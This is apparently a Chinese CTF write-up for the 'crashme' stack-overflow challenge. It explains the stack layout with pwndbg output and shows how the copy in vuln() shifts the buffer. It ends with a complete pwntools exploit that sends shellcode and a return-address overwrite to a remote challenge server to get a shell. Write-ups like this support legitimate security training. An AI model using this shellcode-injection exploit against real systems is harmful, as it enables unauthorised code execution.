挺巧妙的一道题

这题的关键点在于，函数调用的参数是这样的
```c
int chall()
{

    char s[];
    ...
    vuln(char(s), 0x400);
    
}
```

因此，在调用`vuln()`时，复制的起始地址是执行`call vuln`之前的esp。栈布局如下：
```
pwndbg> stack 20
00:0000│ esp      0xffffcb50 —▸ 0xffffcb6c ◂— 'crashme'
01:0004│          0xffffcb54 ◂— 0x400
02:0008│          0xffffcb58 ◂— 0x8
03:000c│          0xffffcb5c ◂— 0xd8
04:0010│          0xffffcb60 —▸ 0xf7de276c ◂— add    byte ptr [eax + 0x64], bh
05:0014│          0xffffcb64 —▸ 0xf7fcb110 —▸ 0xf7dd1000 ◂— jg     0xf7dd1047
06:0018│          0xffffcb68 —▸ 0xffffcbbc ◂— 0x0
07:001c│ eax edx  0xffffcb6c ◂— 'crashme'
08:0020│          0xffffcb70 ◂— 0x656d68 /* 'hme' */
09:0024│          0xffffcb74 ◂— 0x0
0a:0028│          0xffffcb78 —▸ 0xf7ffd000 ◂— and    al, 0xbf /* 0x2bf24 */
0b:002c│          0xffffcb7c —▸ 0xf7de276c ◂— add    byte ptr [eax + 0x64], bh
0c:0030│          0xffffcb80 —▸ 0xf7dd890c ◂— add    byte ptr [eax], al
0d:0034│          0xffffcb84 —▸ 0xf7fd17a2 ◂— pop    edi /* '_dl_catch_error' */
0e:0038│          0xffffcb88 —▸ 0xf7dd968c ◂— pop    ebx /* '[5' */
0f:003c│          0xffffcb8c ◂— 0x677f9a5f
10:0040│          0xffffcb90 —▸ 0xffffcbb8 ◂— 0x0
11:0044│          0xffffcb94 ◂— 0x33bfcd2
12:0048│          0xffffcb98 —▸ 0xffffcc4c ◂— 0xffffffff
13:004c│          0xffffcb9c —▸ 0xf7fcb3e0 —▸ 0xf7ffd990 ◂— 0
```

要注意到，复制的src地址其实是`0xffffcb50`，而我们输入的payload的起始地址为`0xffffcb6c`，所以会多复制`0xffffcb50~0xffffcb6c`之间的字节到`vuln`的栈上。

结合这一点，再考虑到`vuln()`函数会复制`0x400`个字节，会改变栈布局，所以我们需要思考复制之后shellcode的地址，再结合泄露的栈地址，就能够完成exp

```python
from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'i386'
# context.log_level = "debug"

io = remote('node4.buuoj.cn', 28054)
io.recvuntil(b'crash: ')

s_addr = int(io.recvuntil(b'\n', drop=True), 16)
io.success("s addr: ", hex(s_addr))

payload = b'crashme\x00'.ljust(0x32-0x1c, b'a')+p32(0xdeadbeef)+p32(s_addr-0x1c)+asm(shellcraft.sh())
io.sendline(payload)

io.interactive()
```

ps: 如果以`\n`作为输入的结束，`char *__cdecl fgets(char *_Buffer, int _MaxCount, FILE *_Stream)`写入`_Buffer`的内容中包含最后一个换行符。